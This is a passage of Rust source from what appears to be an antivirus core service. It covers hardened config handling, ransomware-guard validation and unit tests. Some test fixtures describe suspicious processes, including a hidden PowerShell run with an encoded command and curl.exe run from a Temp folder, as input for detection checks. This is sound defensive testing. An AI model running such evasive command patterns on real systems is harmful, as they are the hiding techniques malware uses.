    ensure_regular_config_metadata(path, label, &metadata)?;
    Ok(metadata)
}

fn ensure_regular_config_metadata(
    path: &Path,
    label: &str,
    metadata: &std::fs::Metadata,
) -> anyhow::Result<()> {
    if metadata.file_type().is_symlink() {
        return Err(anyhow::anyhow!(
            "refusing to read symbolic link {label} {}",
            path.display()
        ));
    }
    if config_metadata_is_windows_reparse_point(metadata) {
        return Err(anyhow::anyhow!(
            "refusing to read reparse point {label} {}",
            path.display()
        ));
    }
    if !metadata.file_type().is_file() {
        return Err(anyhow::anyhow!(
            "{label} {} is not a regular file",
            path.display()
        ));
    }
    Ok(())
}

#[cfg(windows)]
fn config_metadata_is_windows_reparse_point(metadata: &std::fs::Metadata) -> bool {
    use std::os::windows::fs::MetadataExt;
    const FILE_ATTRIBUTE_REPARSE_POINT: u32 = 0x400;
    metadata.file_attributes() & FILE_ATTRIBUTE_REPARSE_POINT != 0
}

#[cfg(not(windows))]
fn config_metadata_is_windows_reparse_point(_metadata: &std::fs::Metadata) -> bool {
    false
}

fn ransomware_guard_config_path() -> anyhow::Result<PathBuf> {
    if let Some(path) = absolute_config_env_path("AVORAX_RANSOMWARE_GUARD_CONFIG")? {
        return Ok(path);
    }
    Ok(guard_config_base()?.join("ransomware_guard.json"))
}

fn normalize_ransomware_paths(paths: Vec<String>, protected: bool) -> anyhow::Result<Vec<String>> {
    let mut normalized = Vec::new();
    for raw in paths {
        let value = raw.trim().replace('\\', "/");
        if value.is_empty() {
            continue;
        }
        if protected && ransomware_root_too_broad(&value) {
            return Err(anyhow::anyhow!("protected root is too broad: {value}"));
        }
        if !normalized.iter().any(|existing| existing == &value) {
            normalized.push(value);
        }
    }
    Ok(normalized)
}

fn ransomware_root_too_broad(path: &str) -> bool {
    let trimmed = path.trim().trim_end_matches('/');
    let lower = trimmed.to_ascii_lowercase();
    lower == "/"
        || lower.len() <= 2
        || lower.ends_with(':')
        || matches!(
            lower.as_str(),
            "c:/windows"
                | "c:/program files"
                | "c:/program files (x86)"
                | "c:/programdata"
                | "/system"
                | "/usr"
                | "/bin"
                | "/sbin"
                | "/etc"
        )
}

fn validate_ransomware_guard_config(config: &PersistedRansomwareGuardConfig) -> anyhow::Result<()> {
    for root in &config.protected_roots {
        validate_persisted_ransomware_path(root, "protected root")?;
        let value = root.trim().replace('\\', "/");
        if value.is_empty() {
            return Err(anyhow::anyhow!("protected root is empty"));
        }
        if ransomware_root_too_broad(&value) {
            return Err(anyhow::anyhow!("protected root is too broad: {value}"));
        }
    }
    for trusted in &config.trusted_process_allowlist {
        validate_persisted_ransomware_path(trusted, "trusted process allowlist entry")?;
        if trusted.trim().is_empty() {
            return Err(anyhow::anyhow!("trusted process allowlist entry is empty"));
        }
    }
    validate_persisted_ransomware_source(&config.source)?;
    Ok(())
}

fn validate_persisted_ransomware_path(value: &str, label: &str) -> anyhow::Result<()> {
    if value.contains('\0') {
        anyhow::bail!("{label} contains NUL");
    }
    if value.chars().count() > MAX_CORE_IPC_PATH_CHARS {
        anyhow::bail!("{label} exceeds maximum length of {MAX_CORE_IPC_PATH_CHARS} characters");
    }
    Ok(())
}

fn validate_persisted_ransomware_source(value: &str) -> anyhow::Result<()> {
    let trimmed = value.trim();
    if trimmed.is_empty() {
        anyhow::bail!("ransomware guard config source is empty");
    }
    if trimmed.contains('\0') {
        anyhow::bail!("ransomware guard config source contains NUL");
    }
    if trimmed.chars().count() > MAX_CORE_IPC_LABEL_CHARS {
        anyhow::bail!(
            "ransomware guard config source exceeds maximum length of {MAX_CORE_IPC_LABEL_CHARS} characters"
        );
    }
    Ok(())
}

fn write_guard_mode_config(raw_mode: &str) -> anyhow::Result<String> {
    let mode = normalize_guard_mode(raw_mode)
        .ok_or_else(|| anyhow::anyhow!("unsupported guard mode: {raw_mode}"))?;
    let path = guard_mode_config_path()?;
    ensure_config_parent(&path)?;
    write_config_staged(
        &path,
        &serde_json::to_string_pretty(&json!({
            "mode": mode,
            "updated_at": Utc::now(),
            "source": "avorax_local_core"
        }))?,
    )?;
    Ok(path.display().to_string())
}

fn ensure_config_parent(path: &Path) -> anyhow::Result<()> {
    if let Some(parent) = path
        .parent()
        .filter(|parent| !parent.as_os_str().is_empty())
    {
        std::fs::create_dir_all(parent)?;
        ensure_config_directory(parent, "configuration parent directory")?;
    }
    Ok(())
}

fn write_config_staged(path: &Path, contents: &str) -> anyhow::Result<()> {
    ensure_config_parent(path)?;
    let temp_path = path.with_extension(format!(
        "{}.tmp-{}",
        config_temp_extension(path),
        Uuid::new_v4()
    ));
    write_config_file_exclusive(
        &temp_path,
        contents.as_bytes(),
        "temporary configuration file",
    )?;
    if let Err(error) = remove_existing_config_file(path, "configuration file") {
        cleanup_staged_local_core_file(&temp_path, "temporary configuration file")
            .with_context(|| {
                format!(
                    "failed to clean up temporary configuration file {} after activation preflight failed: {error:#}",
                    temp_path.display()
                )
            })?;
        return Err(error);
    }
    if let Err(error) = std::fs::rename(&temp_path, path) {
        cleanup_staged_local_core_file(&temp_path, "temporary configuration file")
            .with_context(|| {
                format!(
                    "failed to clean up temporary configuration file {} after activation failed: {error:#}",
                    temp_path.display()
                )
            })?;
        return Err(error)
            .with_context(|| format!("failed to activate configuration file {}", path.display()));
    }
    Ok(())
}

fn config_temp_extension(path: &Path) -> &str {
    match path.extension().and_then(|value| value.to_str()) {
        Some(extension) => extension,
        None => default_config_temp_extension(),
    }
}

fn default_config_temp_extension() -> &'static str {
    "json"
}

fn ensure_config_metadata_safe(metadata: &std::fs::Metadata, label: &str) -> anyhow::Result<()> {
    if metadata.file_type().is_symlink() {
        return Err(anyhow::anyhow!("refusing to use symbolic link {label}"));
    }
    #[cfg(windows)]
    {
        use std::os::windows::fs::MetadataExt;
        const FILE_ATTRIBUTE_REPARSE_POINT: u32 = 0x400;
        if metadata.file_attributes() & FILE_ATTRIBUTE_REPARSE_POINT != 0 {
            return Err(anyhow::anyhow!("refusing to use reparse point {label}"));
        }
    }
    Ok(())
}

fn ensure_config_directory(path: &Path, label: &str) -> anyhow::Result<()> {
    let metadata = std::fs::symlink_metadata(path)
        .with_context(|| format!("failed to inspect {label} {}", path.display()))?;
    ensure_config_metadata_safe(&metadata, label)?;
    if !metadata.is_dir() {
        return Err(anyhow::anyhow!("{label} is not a directory"));
    }
    Ok(())
}

fn remove_existing_config_file(path: &Path, label: &str) -> anyhow::Result<()> {
    match std::fs::symlink_metadata(path) {
        Ok(metadata) => {
            ensure_config_metadata_safe(&metadata, label)?;
            if !metadata.is_file() {
                return Err(anyhow::anyhow!("{label} is not a regular file"));
            }
            std::fs::remove_file(path)
                .with_context(|| format!("failed to remove {label} {}", path.display()))?;
            Ok(())
        }
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => Ok(()),
        Err(error) => {
            Err(error).with_context(|| format!("failed to inspect {label} {}", path.display()))
        }
    }
}

fn write_config_file_exclusive(path: &Path, bytes: &[u8], label: &str) -> anyhow::Result<()> {
    let mut output = std::fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .open(path)
        .with_context(|| format!("failed to create {label} {}", path.display()))?;
    output
        .write_all(bytes)
        .with_context(|| format!("failed to write {label} {}", path.display()))?;
    output
        .sync_all()
        .with_context(|| format!("failed to sync {label} {}", path.display()))?;
    Ok(())
}

fn normalize_guard_mode(raw: &str) -> Option<&'static str> {
    let normalized = raw.trim().replace(['-', '_', ' '], "").to_ascii_lowercase();
    match normalized.as_str() {
        "off" | "disabled" => Some("disabled"),
        "monitoronly" | "observeonly" => Some("monitorOnly"),
        "balanced" => Some("balanced"),
        "blockconfirmedthreats" | "blockconfirmed" => Some("blockConfirmedThreats"),
        "lockdown" => Some("lockdown"),
        "developermode" | "developer" => Some("developerMode"),
        _ => None,
    }
}

fn guard_mode_config_path() -> anyhow::Result<PathBuf> {
    if let Some(path) = absolute_config_env_path("AVORAX_GUARD_MODE_CONFIG")? {
        return Ok(path);
    }
    if let Some(path) = absolute_config_env_path("ZENTOR_GUARD_MODE_CONFIG")? {
        return Ok(path);
    }
    Ok(guard_config_base()?.join("guard_mode.json"))
}

fn guard_config_base() -> anyhow::Result<PathBuf> {
    if let Some(path) = absolute_config_env_path("AVORAX_CONFIG_DIR")? {
        return Ok(path);
    }
    if let Some(path) = absolute_config_env_path("AVORAX_DATA_DIR")? {
        return Ok(path.join("config"));
    }
    #[cfg(windows)]
    {
        if let Some(program_data) = absolute_config_env_path("ProgramData")? {
            return Ok(program_data.join("Avorax").join("Config"));
        }
        if let Some(program_data) = absolute_config_env_path("PROGRAMDATA")? {
            return Ok(program_data.join("Avorax").join("Config"));
        }
    }
    #[cfg(target_os = "macos")]
    {
        if let Some(home) = absolute_config_env_path("HOME")? {
            return Ok(home
                .join("Library")
                .join("Application Support")
                .join("Avorax")
                .join("Config"));
        }
    }
    if let Some(home) = absolute_config_env_path("HOME")? {
        return Ok(home.join(".local/share/avorax/config"));
    }
    anyhow::bail!("local-core shared config root is unavailable")
}

fn absolute_config_env_path(name: &str) -> anyhow::Result<Option<PathBuf>> {
    let Some(value) = std::env::var_os(name) else {
        return Ok(None);
    };
    let text = value.to_string_lossy().trim().to_string();
    if text.is_empty() {
        anyhow::bail!("{name} is empty");
    }
    validate_local_core_env_root_text(name, &text)?;
    let path = PathBuf::from(text);
    if !config_root_is_allowed(&path) {
        anyhow::bail!("{name} must be an absolute local path: {}", path.display());
    }
    Ok(Some(path))
}

#[cfg(windows)]
fn config_root_is_allowed(path: &Path) -> bool {
    use std::path::{Component, Prefix};

    match path.components().next() {
        Some(Component::Prefix(prefix)) => {
            matches!(prefix.kind(), Prefix::Disk(_) | Prefix::VerbatimDisk(_))
        }
        _ => false,
    }
}

#[cfg(not(windows))]
fn config_root_is_allowed(path: &Path) -> bool {
    path.is_absolute()
}

#[cfg(test)]
fn test_env_lock() -> std::sync::MutexGuard<'static, ()> {
    // Environment variables are process-wide, so every test module shares one lock.
    static LOCK: std::sync::OnceLock<std::sync::Mutex<()>> = std::sync::OnceLock::new();
    LOCK.get_or_init(|| std::sync::Mutex::new(()))
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner())
}

#[cfg(test)]
fn normalized_test_source(source: &str) -> String {
    source.replace("\r\n", "\n").replace('\r', "\n")
}

#[cfg(test)]
mod tests {
    use super::*;
    use app_control::known_good_store::KnownGoodStore;
    use app_control::publisher_trust::TrustedPublisherPolicy;
    use app_control::trust_store::is_dangerous_allowlist_path;
    use app_control::user_approval::UserApprovalStore;
    use app_control::{
        ApplicationControlDecision, ApplicationControlInput, ApplicationControlPolicy,
        ApplicationTrustLevel, ProtectionMode,
    };
    use std::fs;
    use tempfile::tempdir;

    const TRUSTED_FIXTURE_HASH: &str =
        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
    const USER_APPROVED_FIXTURE_HASH: &str =
        "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";

    fn test_core_command(command: &str) -> CoreCommand {
        CoreCommand {
            command: command.to_string(),
            path: None,
            paths: None,
            action_mode: None,
            scan_kind: None,
            threat_name: None,
            engine: None,
            quarantine_id: None,
            allowlist_id: None,
            confirmed: None,
            sha256: None,
            user_label: None,
            user_note: None,
            previous_verdict: None,
            protection_mode: None,
            protected_roots: None,
            trusted_process_allowlist: None,
            ransomware_activity: None,
            process_observations: None,
            process_monitor_policy: None,
            duration_ms: None,
            poll_interval_ms: None,
            max_events: None,
        }
    }

    #[test]
    fn core_command_rejects_oversized_json_before_parse() {
        let raw = "x".repeat(MAX_CORE_COMMAND_JSON_BYTES + 1);

        let error = parse_core_command_line(&raw).unwrap_err().to_string();

        assert!(error.contains("core command JSON"));
        assert!(error.contains("exceeds maximum size"));
    }

    #[test]
    fn core_command_reader_rejects_oversized_json_before_line_allocation() {
        let raw = "x".repeat(MAX_CORE_COMMAND_JSON_BYTES + 1);
        let mut reader = io::Cursor::new(raw.into_bytes());

        let error = read_next_core_command_line(&mut reader)
            .unwrap_err()
            .to_string();

        assert!(error.contains("core command JSON"));
        assert!(error.contains("exceeds maximum size"));
    }

    #[test]
    fn core_command_rejects_unknown_json_fields() {
        let error = parse_core_command_line(r#"{"command":"health","confirmed_extra":true}"#)
            .unwrap_err()
            .to_string();

        assert!(error.contains("failed to parse core command JSON"));
    }

    #[test]
    fn core_command_schema_stays_strict() {
        let api_source = crate::normalized_test_source(include_str!("api/mod.rs"));
        let main_source = crate::normalized_test_source(include_str!("main.rs"));
        let command_start = api_source.find("pub struct CoreCommand").unwrap();
        let response_start = api_source.find("pub struct CoreResponse").unwrap();
        let parser_start = main_source.find("fn parse_core_command_line").unwrap();
        let parser_end = main_source
            .find("#[cfg(windows)]\nwindows_service")
            .unwrap();
        let parser_source = &main_source[parser_start..parser_end];

        assert!(api_source[..command_start].contains("#[serde(deny_unknown_fields)]"));
        assert!(api_source[command_start..response_start].contains("pub confirmed: Option<bool>"));
        assert!(parser_source.contains("serde_json::from_str(line)"));
        assert!(parser_source.contains("failed to parse core command JSON"));
    }

    #[test]
    fn process_snapshot_ipc_reports_suspicious_findings_without_active_loop_claim() {
        let command: CoreCommand = serde_json::from_value(json!({
            "command": "evaluate_process_snapshot",
            "process_observations": [{
                "pid": 42,
                "parent_pid": 1,
                "image_path": "C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe",
                "command_line": "powershell.exe -WindowStyle Hidden -EncodedCommand benignfixture",
                "signer_trusted": true
            }],
            "process_monitor_policy": {
                "suspicious_threshold": 40
            }
        }))
        .unwrap();

        let response = handle(command);

        assert_eq!(response["ok"], true);
        assert_eq!(response["status"], "notActive");
        assert_eq!(response["findings"].as_array().unwrap().len(), 1);
        assert_eq!(response["findings"][0]["verdict"], "suspiciousProcess");
        assert!(response["status_reason"]
            .as_str()
            .unwrap()
            .contains("snapshot-only"));
    }

    #[test]
    fn process_snapshot_ipc_honors_policy_allowlist() {
        let allowed = "C:/Users/Brent/AppData/Local/Temp/curl.exe";
        let command: CoreCommand = serde_json::from_value(json!({
            "command": "evaluate_process_snapshot",
            "process_observations": [{
                "pid": 77,
                "image_path": allowed,
                "command_line": "curl.exe https://example.invalid/benign-fixture",
                "signer_trusted": false
            }],
            "process_monitor_policy": {
                "allowed_image_paths": [allowed]
            }
        }))
        .unwrap();

        let response = handle(command);

        assert_eq!(response["ok"], true);
        assert_eq!(response["observed_processes"], 1);
        assert_eq!(response["findings"].as_array().unwrap().len(), 0);
    }

    #[test]
    fn process_snapshot_ipc_rejects_unknown_nested_observation_fields() {
        let error = serde_json::from_value::<CoreCommand>(json!({
            "command": "evaluate_process_snapshot",
            "process_observations": [{
                "pid": 42,
                "image_path": "C:/Windows/System32/notepad.exe",
                "auto_quarantine": true
            }]
        }))
        .unwrap_err()
        .to_string();

        assert!(error.contains("auto_quarantine"));
    }

    #[test]
    fn process_snapshot_ipc_requires_explicit_observations() {
        let command: CoreCommand = serde_json::from_value(json!({
            "command": "evaluate_process_snapshot"
        }))
        .unwrap();

        let response = handle(command);

        assert_eq!(response["ok"], false);
        assert!(response["error"]
            .as_str()
            .unwrap()
            .contains("process_observations is required"));
    }

    #[test]
    fn ransomware_activity_ipc_uses_persisted_config_and_reports_signal() {
        let _lock = env_lock();
        let dir = tempdir().unwrap();
        let config_path = dir.path().join("ransomware_guard.json");
        let documents = dir.path().join("Documents");
        let downloads = dir.path().join("Downloads");
        fs::create_dir_all(&documents).unwrap();
        fs::create_dir_all(&downloads).unwrap();
        unsafe {
            std::env::set_var("AVORAX_RANSOMWARE_GUARD_CONFIG", &config_path);
        }
        write_ransomware_guard_config(vec![documents.display().to_string()], vec![]).unwrap();
        let mut modified_paths = (0..25)
            .map(|index| {
                documents
                    .join(format!("protected-{index}.docx"))
                    .display()
                    .to_string()
            })
            .collect::<Vec<_>>();
        modified_paths.extend((0..25).map(|index| {
            downloads
                .join(format!("outside-{index}.tmp"))
                .display()
                .to_string()
        }));
        let command: CoreCommand = serde_json::from_value(json!({
            "command": "evaluate_ransomware_activity",
            "ransomware_activity": {
                "process_id": 4242,
                "process_path": dir.path().join("Temp/bad.exe").display().to_string(),
                "modified_paths": modified_paths,
                "files_renamed_count": 50,
                "entropy_change_score": 0.8,
                "ransom_note_score": 0.0,
                "backup_tamper_score": 0.0,
                "time_window_seconds": 60
            }
        }))
        .unwrap();

        let response = handle(command);

        assert_eq!(response["ok"], true);
        assert_eq!(response["detected"], true);
        assert_eq!(response["config_source"], "avorax_local_core");
        assert_eq!(response["signal"]["process_id"], 4242);
        assert_eq!(response["signal"]["files_modified_count"], 25);
        assert_eq!(
            response["signal"]["affected_paths"]
                .as_array()
                .unwrap()
                .len(),
            25
        );
        assert_eq!(response["signal"]["confidence"], "medium");
        let limitations = response["limitations"].as_array().unwrap();
        assert!(limitations
            .iter()
            .any(|value| value.as_str() == Some("caller-supplied-activity-observations-only")));
        assert!(limitations
            .iter()
            .any(|value| value.as_str() == Some("no-kernel-pre-execution-blocking")));
        unsafe {
            std::env::remove_var("AVORAX_RANSOMWARE_GUARD_CONFIG");
        }
    }

    #[test]
    fn ransomware_activity_ipc_honors_trusted_process_and_critical_override() {
        let _lock = env_lock();
        let dir = tempdir().unwrap();
        let config_path = dir.path().join("ransomware_guard.json");
        let documents = dir.path().join("Documents");
        let backup = dir.path().join("Backup/backup.exe");
        fs::create_dir_all(&documents).unwrap();
        fs::create_dir_all(backup.parent().unwrap()).unwrap();
        unsafe {
            std::env::set_var("AVORAX_RANSOMWARE_GUARD_CONFIG", &config_path);
        }
        write_ransomware_guard_config(
            vec![documents.display().to_string()],
            vec![backup.display().to_string()],
        )
        .unwrap();
        let modified_paths = (0..30)
            .map(|index| {
                documents
                    .join(format!("protected-{index}.docx"))
                    .display()
                    .to_string()
            })
            .collect::<Vec<_>>();
        let trusted: CoreCommand = serde_json::from_value(json!({
            "command": "evaluate_ransomware_activity",
            "ransomware_activity": {
                "process_id": 42,
                "process_path": backup.display().to_string(),
                "modified_paths": modified_paths,
                "files_renamed_count": 30,
                "entropy_change_score": 0.8,
                "ransom_note_score": 0.0,
                "backup_tamper_score": 0.0,
                "time_window_seconds": 60
            }
        }))
        .unwrap();
        let trusted_response = handle(trusted);
        assert_eq!(trusted_response["ok"], true);
        assert_eq!(trusted_response["detected"], false);
        assert!(trusted_response["signal"].is_null());

        let critical_paths = (0..30)
            .map(|index| {
                documents
                    .join(format!("critical-{index}.docx"))
                    .display()
                    .to_string()
            })
            .collect::<Vec<_>>();
        let critical: CoreCommand = serde_json::from_value(json!({
            "command": "evaluate_ransomware_activity",
            "ransomware_activity": {
                "process_id": 42,
                "process_path": backup.display().to_string(),
                "modified_paths": critical_paths,
                "files_renamed_count": 30,
                "entropy_change_score": 0.8,
                "ransom_note_score": 0.9,
                "backup_tamper_score": 0.95,
                "time_window_seconds": 60
            }
        }))
        .unwrap();
        let critical_response = handle(critical);
        assert_eq!(critical_response["ok"], true);
        assert_eq!(critical_response["detected"], true);
        assert_eq!(critical_response["signal"]["confidence"], "high");
        unsafe {
            std::env::remove_var("AVORAX_RANSOMWARE_GUARD_CONFIG");
        }
    }

    #[test]
    fn ransomware_activity_ipc_rejects_missing_unbounded_or_unknown_input() {
        let missing = handle(test_core_command("evaluate_ransomware_activity"));
        assert_eq!(missing["ok"], false);
        assert!(missing["error"]
            .as_str()
            .unwrap()
            .contains("ransomware_activity is required"));

        let mut too_many_paths = Vec::new();
        for index in 0..=MAX_CORE_IPC_PATHS {
            too_many_paths.push(format!("C:/Users/Test/Documents/file-{index}.docx"));
        }
        let unbounded: CoreCommand = serde_json::from_value(json!({
            "command": "evaluate_ransomware_activity",
            "ransomware_activity": {
                "process_id": 42,
                "process_path": "C:/Users/Test/AppData/Temp/bad.exe",
                "modified_paths": too_many_paths,
                "files_renamed_count": 1,
                "entropy_change_score": 1.1,
                "ransom_note_score": 0.0,
                "backup_tamper_score": 0.0,
                "time_window_seconds": 60
            }
        }))
        .unwrap();
        let unbounded_response = handle(unbounded);
        assert_eq!(unbounded_response["ok"], false);
        assert!(unbounded_response["error"]
            .as_str()
            .unwrap()
            .contains("modified_paths exceeds maximum entry count"));

        let error = serde_json::from_value::<CoreCommand>(json!({
            "command": "evaluate_ransomware_activity",
            "ransomware_activity": {
                "process_id": 42,
                "process_path": "C:/Users/Test/AppData/Temp/bad.exe",
                "modified_paths": ["C:/Users/Test/Documents/file.docx"],
                "files_renamed_count": 1,
                "entropy_change_score": 0.8,
                "ransom_note_score": 0.0,
                "backup_tamper_score": 0.0,
                "time_window_seconds": 60,
                "auto_quarantine": true
            }
        }))
        .unwrap_err();

        assert!(error.to_string().contains("auto_quarantine"));
    }

    #[cfg(not(windows))]
    #[test]
    fn core_service_mode_fails_visibly_off_windows() {
        let error = run_service().unwrap_err().to_string();

        assert!(error
            .contains("Avorax Core Service Windows service mode is unsupported on this platform"));
    }

    #[test]
    fn core_bounded_line_chunk_consumption_is_explicit() {
        let source = include_str!("main.rs");
        let start = source.find("fn read_next_bounded_line").unwrap();
        let end = source.find("fn parse_core_command_line").unwrap();
        let line_source = &source[start..end];

        assert_eq!(bytes_to_consume_for_line_chunk(b"abc\nrest", Some(3)), 4);
        assert_eq!(bytes_to_consume_for_line_chunk(b"abc", None), 3);
        assert!(line_source.contains("bytes_to_consume_for_line_chunk(available, newline)"));
        assert!(line_source.contains("match newline"));
        assert!(line_source.contains("Some(index) => index + 1"));
        assert!(line_source.contains("None => available.len()"));
        assert!(!line_source.contains("newline.map(|index| index + 1).unwrap_or"));
    }

    #[test]
    fn scan_error_details_are_bounded_and_normalized() {
        let mut scan_errors = Vec::new();
        push_scan_error(
            &mut scan_errors,
            format!("{}\0tail", "A".repeat(MAX_SCAN_ERROR_DETAIL_CHARS + 128)),
        );

        assert_eq!(scan_errors.len(), 1);
        assert!(scan_errors[0].ends_with(SCAN_ERROR_TRUNCATION_SUFFIX));
        assert!(scan_errors[0].len() <= MAX_SCAN_ERROR_DETAIL_CHARS);
        assert!(!scan_errors[0].contains('\0'));

        let mut short_errors = Vec::new();
        push_scan_error(&mut short_errors, "bad\0detail".to_string());
        assert_eq!(short_errors[0], "bad\\0detail");
    }

    #[test]
    fn scan_error_details_keep_existing_count_cap() {
        let mut scan_errors = Vec::new();
        for index in 0..(MAX_SCAN_ERROR_DETAILS + 5) {
            push_scan_error(&mut scan_errors, format!("scan error {index}"));
        }

        assert_eq!(scan_errors.len(), MAX_SCAN_ERROR_DETAILS);
        assert_eq!(scan_errors.last().unwrap(), &scan_error_omission_notice());
        assert!(!scan_errors.iter().any(|error| error == "scan error 24"));
    }

    #[test]
    fn scan_file_rejects_oversized_ipc_path() {
        let mut command = test_core_command("scan_file");
        command.path = Some("x".repeat(MAX_CORE_IPC_PATH_CHARS + 1));

        let response = handle(command);

        assert_eq!(response["ok"], false);
        assert!(response["error"]
            .as_str()
            .unwrap()
            .contains("exceeds maximum length"));
    }

    #[test]
    fn scan_file_rejects_nul_ipc_path() {
        let mut command = test_core_command("scan_file");
        command.path = Some("C:/Temp/bad\0name.exe".to_string());

        let response = handle(command);

        assert_eq!(response["ok"], false);
        assert!(response["error"].as_str().unwrap().contains("NUL byte"));
    }

    #[test]
    fn start_watch_rejects_excessive_ipc_paths() {
        let mut command = test_core_command("start_watch");
        command.paths = Some(
            (0..=MAX_CORE_IPC_PATHS)
                .map(|index| format!("C:/Temp/path-{index}"))
                .collect(),
        );

        let response = handle(command);

        assert_eq!(response["ok"], false);
        assert!(response["error"]
            .as_str()
            .unwrap()
            .contains("maximum entry count"));
    }

    #[test]
    fn scan_file_rejects_oversized_action_mode() {
        let mut command = test_core_command("scan_file");
        command.path = Some("C:/Temp/tool.exe".to_string());
        command.action_mode = Some("x".repeat(MAX_CORE_IPC_MODE_CHARS + 1));

        let response = handle(command);

        assert_eq!(response["ok"], false);
        assert!(response["error"]
            .as_str()
            .unwrap()
            .contains("action_mode exceeds maximum length"));
    }

    #[test]
    fn quarantine_file_rejects_oversized_threat_name() {
        let mut command = test_core_command("quarantine_file");
        command.path = Some("C:/Temp/bad.exe".to_string());
        command.threat_name = Some("x".repeat(MAX_CORE_IPC_THREAT_NAME_CHARS + 1));

        let response = handle(command);

        assert_eq!(response["ok"], false);
        assert!(response["error"]
            .as_str()
            .unwrap()
            .contains("threat_name exceeds maximum length"));
    }

    #[test]
    fn restore_quarantine_item_rejects_oversized_id() {
        let mut command = test_core_command("restore_quarantine_item");
        command.quarantine_id = Some("x".repeat(MAX_CORE_IPC_ID_CHARS + 1));
        command.confirmed = Some(true);

        let response = handle(command);

        assert_eq!(response["ok"], false);
        assert!(response["error"]
            .as_str()
            .unwrap()
            .contains("quarantine_id exceeds maximum length"));
    }

    #[test]
    fn restore_quarantine_item_requires_explicit_confirmation_field() {
        let mut command = test_core_command("restore_quarantine_item");
        command.quarantine_id = Some("quarantine-id".to_string());

        let response = handle(command);

        assert_eq!(response["ok"], false);
        assert!(response["error"]
            .as_str()
            .unwrap()
            .contains("restore requires explicit confirmation"));
    }

    #[test]
    fn delete_quarantine_item_requires_explicit_confirmation_field() {
        let mut command = test_core_command("delete_quarantine_item");
        command.quarantine_id = Some("quarantine-id".to_string());

        let response = handle(command);

        assert_eq!(response["ok"], false);
        assert!(response["error"]
            .as_str()
            .unwrap()
            .contains("delete requires explicit confirmation"));
    }

    #[test]
    fn allowlist_removal_requires_explicit_confirmation_field() {
        let mut command = test_core_command("remove_allowlist_entry");
        command.allowlist_id = Some("allowlist-id".to_string());

        let response = handle(command);

        assert_eq!(response["ok"], false);
        assert!(response["error"]
            .as_str()
            .unwrap()
            .contains("allowlist removal requires explicit confirmation"));
    }

    #[test]
    fn destructive_commands_do_not_default_missing_confirmation() {
        let source = include_str!("main.rs");
        let restore_start = source.find("\"restore_quarantine_item\"").unwrap();
        let label_start =
            restore_start + source[restore_start..].find("\"label_detection\"").unwrap();
        let destructive_source = &source[restore_start..label_start];
        let allowlist_start = source.find("\"remove_allowlist_entry\"").unwrap();
        let allowlist_end = allowlist_start + source[allowlist_start..].find("_ =>").unwrap();
        let allowlist_source = &source[allowlist_start..allowlist_end];

        assert!(destructive_source
            .contains("require_explicit_confirmation(command.confirmed, \"restore\")"));
        assert!(destructive_source
            .contains("require_explicit_confirmation(command.confirmed, \"delete\")"));
        assert!(allowlist_source
            .contains("require_explicit_confirmation(command.confirmed, \"allowlist removal\")"));
        assert!(!destructive_source.contains("confirmed.unwrap_or(false)"));
        assert!(!allowlist_source.contains("command.confirmed != Some(true)"));
    }

    #[test]
    fn label_detection_rejects_oversized_user_note() {
        let mut command = test_core_command("label_detection");
        command.path = Some("C:/Temp/review.exe".to_string());
        command.user_label = Some("falsePositive".to_string());
        command.user_note = Some("x".repeat(MAX_CORE_IPC_NOTE_CHARS + 1));

        let response = handle(command);

        assert_eq!(response["ok"], false);
        assert!(response["error"]
            .as_str()
            .unwrap()
            .contains("user_note exceeds maximum length"));
    }

    #[test]
    fn configure_guard_mode_rejects_nul_mode() {
        let mut command = test_core_command("configure_guard_mode");
        command.protection_mode = Some("balanced\0lockdown".to_string());

        let response = handle(command);

        assert_eq!(response["ok"], false);
        assert!(response["error"]
            .as_str()
            .unwrap()
            .contains("protection_mode contains a NUL byte"));
    }

    #[test]
    fn configure_ransomware_guard_rejects_excessive_protected_roots() {
        let mut command = test_core_command("configure_ransomware_guard");
        command.protected_roots = Some(
            (0..=MAX_CORE_IPC_PATHS)
                .map(|index| format!("C:/Users/Alice/Documents/{index}"))
                .collect(),
        );

        let response = handle(command);

        assert_eq!(response["ok"], false);
        assert!(response["error"]
            .as_str()
            .unwrap()
            .contains("protected_roots exceeds maximum entry count"));
    }

    #[test]
    fn progress_event_line_emits_structured_progress_json() {
        let progress = ScanProgress {
            job_id: "job".to_string(),
            scan_type: ScanKind::Quick,
            status: ScanJobStatus::Running,
            current_path: Some("C:/Temp/tool.exe".to_string()),
            files_scanned: 1,
            folders_scanned: 0,
            bytes_scanned: 128,
            total_files_estimated: Some(2),
            total_bytes_estimated: Some(256),
            threats_found: 0,
            suspicious_found: 0,
            skipped_files: 0,
            permission_denied_count: 0,
            started_at: Utc::now(),
            updated_at: Utc::now(),
            elapsed_seconds: 1,
            estimated_remaining_seconds: None,
            progress_percent: Some(50.0),
        };

        let line = progress_event_line(&progress);
        let value: serde_json::Value = serde_json::from_str(&line).unwrap();

        assert_eq!(value["type"], "progress");
        assert_eq!(value["progress"]["jobId"], "job");
    }

    #[test]
    fn progress_event_serialization_errors_are_not_blank_lines() {
        let source = include_str!("main.rs");
        let start = source.find("fn progress_event_line(").unwrap();
        let end = source.find("fn required_core_ipc_path(").unwrap();
        let helper = &source[start..end];

        assert!(helper.contains("serialize_progress_event_line(progress)"));
        assert!(helper.contains("Err(error) => progress_serialization_error_line(error)"));
        assert!(helper.contains("fn progress_serialization_error_line(error: serde_json::Error)"));
        assert!(helper.contains("Ok(line) => line"));
        assert!(helper.contains("Err(_) => static_progress_serialization_error_line()"));
        assert!(helper.contains("fn static_progress_serialization_error_line() -> String"));
        assert!(helper.contains("progress serialization failed"));
        assert!(!helper.contains(".unwrap_or_else"));
        assert!(!helper.contains("unwrap_or_default()"));
    }

    #[test]
    fn startup_migration_errors_are_not_suppressed() {
        let source = crate::normalized_test_source(include_str!("main.rs"));
        let start = source.find("fn main() -> Result<()>").unwrap();
        let end = source.find("#[cfg(windows)]\nfn run_service").unwrap();
        let main_source = &source[start..end];
        let swallowed_event_pattern = ["let _ = migration::", "write_migration_event_log"].concat();

        assert!(main_source.contains("legacy data migration failed"));
        assert!(main_source.contains("failed to resolve migration event log directory"));
        assert!(main_source.contains("failed to write migration event log"));
